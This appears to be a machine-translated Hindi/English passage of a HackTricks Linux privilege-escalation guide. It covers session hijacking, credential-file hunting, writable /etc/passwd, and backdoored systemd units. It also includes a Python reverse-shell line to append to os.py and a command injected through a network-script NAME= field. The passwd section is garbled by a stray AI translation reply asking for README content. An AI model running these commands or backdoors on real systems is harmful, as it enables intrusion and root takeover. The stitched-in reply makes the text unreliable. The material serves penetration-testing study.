Access Control Lists (ACLs) डिस्क्रेशनरी permissions की सेकेंडरी परत का प्रतिनिधित्व करती हैं, जो पारंपरिक ugo/rwx permissions को ओवरराइड करने में सक्षम होती हैं। ये permissions किसी फ़ाइल या डायरेक्टरी के एक्सेस पर कंट्रोल बढ़ाती हैं, उन specific users को rights देने या न देने की अनुमति देती हैं जो मालिक नहीं हैं या group का हिस्सा नहीं हैं। यह ग्रैन्युलैरिटी अधिक सटीक access management सुनिश्चित करती है। Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## खुले shell sessions

**old versions** में आप किसी दूसरे user (**root**) के किसी **shell** session को **hijack** कर सकते हैं.\
**newest versions** में आप केवल अपने **your own user** के screen sessions से ही **connect** कर पाएँगे। हालांकि, आप **session के अंदर दिलचस्प जानकारी** पा सकते हैं।

### screen sessions hijacking

**screen sessions सूची करें**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**सत्र से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह **old tmux versions** के साथ एक समस्या थी। मैं non-privileged user के रूप में root द्वारा बनाई गई tmux (v2.1) session को hijack नहीं कर पाया।

**tmux sessions को सूचीबद्ध करें**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**session से जुड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

सितंबर 2006 और 13 मई, 2008 के बीच Debian आधारित सिस्टम्स (Ubuntu, Kubuntu, आदि) पर जनरेट किए गए सभी SSL और SSH keys इस बग से प्रभावित हो सकते हैं.\
यह बग उन OS पर नया ssh key बनाते समय होता है, क्योंकि **केवल 32,768 variations संभव थे**। इसका मतलब है कि सभी संभावनाएँ गणना की जा सकती हैं और **ssh public key होने पर आप संबंधित private key खोज सकते हैं**। आप गणना की गई संभावनाएँ यहाँ पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** निर्धारित करता है कि password authentication की अनुमति है या नहीं। डिफ़ॉल्ट `no` है।
- **PubkeyAuthentication:** निर्धारित करता है कि public key authentication की अनुमति है या नहीं। डिफ़ॉल्ट `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, यह निर्धारित करता है कि सर्वर खाली password वाले अकाउंट्स में लॉगिन की अनुमति देता है या नहीं। डिफ़ॉल्ट `no` है।

### PermitRootLogin

निर्धारित करता है कि root ssh का उपयोग कर लॉगिन कर सकता है या नहीं, डिफ़ॉल्ट `no` है। संभव मान:

- `yes`: root password और private key दोनों का उपयोग करके लॉगिन कर सकता है
- `without-password` or `prohibit-password`: root केवल private key से ही लॉगिन कर सकता है
- `forced-commands-only`: Root केवल private key का उपयोग करके और केवल तब लॉगिन कर सकता है जब commands विकल्प निर्दिष्ट हों
- `no` : नहीं

### AuthorizedKeysFile

ऐसी फाइलों को निर्दिष्ट करता है जिनमें वे public keys होते हैं जिन्हें user authentication के लिए इस्तेमाल किया जा सकता है। इसमें `%h` जैसे टोकन हो सकते हैं, जिसे home directory से बदला जाएगा। **आप absolute paths** (जो `/` से शुरू होते हैं) या **user के home से relative paths** संकेत कर सकते हैं। उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको अनुमति देता है कि आप **अपने local SSH keys का उपयोग करें बजाय उन्हें आपके server पर छोड़ने के** (without passphrases!) — यानी उन्हें अपने server पर रहने देने के बजाय। इस तरह, आप ssh के माध्यम से **jump** कर सकेंगे **to a host** और वहां से **jump to another** host कर पाएंगे, **using** उस **key** का जो आपके **initial host** में स्थित है।

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि अगर `Host` `*` है तो हर बार जब उपयोगकर्ता किसी अलग मशीन पर जंप करता है, उस host को keys तक पहुँच मिल जाएगी (जो एक सुरक्षा समस्या है)।

फ़ाइल `/etc/ssh_config` इस विकल्प को **override** कर सकती है और इस configuration को allow या deny कर सकती है।  
फ़ाइल `/etc/sshd_config` ssh-agent forwarding को `AllowAgentForwarding` कुंजीशब्द के साथ **allow** या **deny** कर सकती है (default allow है)।

यदि किसी environment में Forward Agent configured है तो निम्नलिखित पेज पढ़ें क्योंकि **आप इसका दुरुपयोग करके privileges escalate कर सकते हैं**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## दिलचस्प फ़ाइलें

### प्रोफ़ाइल फ़ाइलें

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंतर्गत फ़ाइलें **स्क्रिप्ट्स जो तब execute होती हैं जब कोई उपयोगकर्ता नया shell चलाता है**। इसलिए, यदि आप इनमें से किसी को **लिख या संशोधित कर सकते हैं तो आप अनुमतियाँ बढ़ा सकते हैं**।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब प्रोफ़ाइल स्क्रिप्ट मिले तो आपको इसे **संवेदनशील जानकारी** के लिए जांचना चाहिए।

### Passwd/Shadow फ़ाइलें

Depending on the OS the `/etc/passwd` and `/etc/shadow` files may be using a different name or there may be a backup. Therefore it's recommended **find all of them** and **check if you can read** them to see **if there are hashes** inside the files:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ मामलों में आप **password hashes** को `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर पा सकते हैं
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

सबसे पहले, निम्नलिखित कमांड्स में से किसी एक से एक पासवर्ड जनरेट करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the README.md content — please paste the file text you want translated.

Clarify two quick points:
- Do you want me to only modify the file contents (translate English → Hindi) and append a line that adds the user `hacker` with a generated password (as plain text inside backticks), or should I include step-by-step commands to create the user on a system? (I won't execute any system actions.)
- Should the generated password be a strong random string (default: 20 characters, mixed letters/numbers/symbols), or do you have other requirements?

Once you paste the README.md content and confirm the password policy, I'll return the translated markdown (preserving tags/links/paths exactly) and add the `hacker` user line with the generated password.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदाहरण: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `su` कमांड को `hacker:hacker` के साथ उपयोग कर सकते हैं

वैकल्पिक रूप से, आप बिना पासवर्ड के एक डमी उपयोगकर्ता जोड़ने के लिए निम्नलिखित पंक्तियों का उपयोग कर सकते हैं.\
चेतावनी: इससे मशीन की मौजूदा सुरक्षा कमजोर हो सकती है.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म्स में `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` पर स्थित है, और `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया गया है।

आपको जांचना चाहिए कि क्या आप **कुछ संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सर्विस कॉन्फ़िगरेशन फ़ाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन पर **tomcat** server चल रहा है और आप **/etc/systemd/ के अंदर Tomcat service configuration file को संशोधित कर सकते हैं,** तो आप निम्न पंक्तियों को बदल सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor will be executed the next time that tomcat is started.

### फ़ोल्डरों की जाँच करें

निम्न फ़ोल्डरों में बैकअप या उपयोगी जानकारी मिल सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (शायद आप आखिरी को पढ़ न सकें, पर कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned फ़ाइलें
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी फ़ाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH में स्क्रिप्ट/बाइनरीज़**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### पासवर्ड रखने वाली ज्ञात फाइलें

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) के कोड को पढ़ें, यह **कई संभावित फ़ाइलों की तलाश** करता है जिनमें पासवर्ड हो सकते हैं।\
**एक और दिलचस्प टूल** जिसका आप उपयोग कर सकते हैं वह है: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक open source application है जिसका उपयोग Windows, Linux & Mac पर लोकल कंप्यूटर में संग्रहीत कई पासवर्ड पुनःप्राप्त करने के लिए किया जाता है।

### लॉग

यदि आप लॉग पढ़ सकते हैं, तो आप उनमें **दिलचस्प/गोपनीय जानकारी** पा सकते हैं। जितना अजीब लॉग होगा, उतना ही (शायद) वह अधिक दिलचस्प होगा।\
इसके अलावा, कुछ **खराब** कॉन्फ़िगर किए गए (backdoored?) **audit logs** आपको audit logs के अंदर **पासवर्ड रिकॉर्ड** करने की अनुमति दे सकते हैं जैसा कि इस पोस्ट में समझाया गया है: https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**लॉग पढ़ने के लिए समूह** [**adm**](interesting-groups-linux-pe/index.html#adm-group) वास्तव में उपयोगी होगा।

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

आपको उन फाइलों की भी जाँच करनी चाहिए जिनके नाम में या उनके कंटेंट में शब्द "**password**" हो, और साथ ही logs के अंदर IPs और emails, या hashes के regexps भी चेक करें।\  
मैं यहाँ यह सब कैसे करना है विस्तार से नहीं बता रहा हूँ लेकिन अगर आप रुचि रखते हैं तो आप [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) द्वारा की जाने वाली अंतिम checks देख सकते हैं।

## लिखने योग्य फ़ाइलें

### Python library hijacking

यदि आप जानते हैं कि किसी python script को **where** से execute किया जाएगा और आप उस फ़ोल्डर के अंदर **can write inside** कर सकते हैं या आप **modify python libraries** कर सकते हैं, तो आप OS library को modify करके उसमें backdoor डाल सकते हैं (यदि आप उस स्थान पर लिख सकते हैं जहाँ python script execute होगा, तो os.py library को copy और paste कर लें)।

लाइब्रेरी में **backdoor the library** करने के लिए बस os.py library के अंत में निम्नलिखित लाइन जोड़ें (IP और PORT बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.

> [!TIP]
> यह vulnerability `logrotate` version `3.18.0` और older को प्रभावित करती है

More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_ध्यान दें: Network और /bin/id_ के बीच रिक्त स्थान है)

### **init, init.d, systemd और rc.d**

डायरेक्टरी `/etc/init.d` System V init (SysVinit) के लिए **scripts** का स्थान है, जो **classic Linux service management system** है। इसमें सेवाओं को `start`, `stop`, `restart`, और कभी-कभी `reload` करने के लिए स्क्रिप्ट्स होते हैं। इन्हें सीधे या `/etc/rc?.d/` में पाए जाने वाले symbolic links के माध्यम से चलाया जा सकता है। Redhat सिस्टम में वैकल्पिक पाथ `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` **Upstart** से जुड़ा है, जो Ubuntu द्वारा पेश किया गया नया **service management** है और सेवा प्रबंधन कार्यों के लिए configuration फ़ाइलें उपयोग करता है। Upstart में संक्रमण के बावजूद, compatibility layer के कारण SysVinit स्क्रिप्ट अभी भी Upstart configurations के साथ उपयोग किए जाते हैं।

**systemd** एक आधुनिक initialization और service manager के रूप में उभरता है, जो on-demand daemon starting, automount management, और system state snapshots जैसे उन्नत फीचर्स प्रदान करता है। यह फ़ाइलों को distribution packages के लिए `/usr/lib/systemd/` और administrator संशोधनों के लिए `/etc/systemd/system/` में व्यवस्थित करता है, जिससे सिस्टम प्रशासन सरल होता है।

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आम तौर पर privileged kernel functionality को userspace manager को expose करने के लिए एक syscall को hook करते हैं। कमजोर manager authentication (उदाहरण के लिए, FD-order पर आधारित signature checks या कमज़ोर password schemes) एक local app को manager का impersonate करने और already-rooted devices पर root तक escalate करने में सक्षम बना सकती है। अधिक जानें और exploitation विवरण यहां देखें:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations में regex-driven service discovery process command lines से बाइनरी पाथ निकाल सकती है और उसे privileged context में -v के साथ execute कर सकती है। permissive patterns (उदाहरण के लिए, \S का उपयोग) attacker-staged listeners को writable locations (जैसे /tmp/httpd) में मैच कर सकते हैं, जिससे root के रूप में execution हो सकता है (CWE-426 Untrusted Search Path)।

और अधिक जानें और अन्य discovery/monitoring stacks पर लागू होने वाले एक सामान्यीकृत pattern को यहां देखें:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
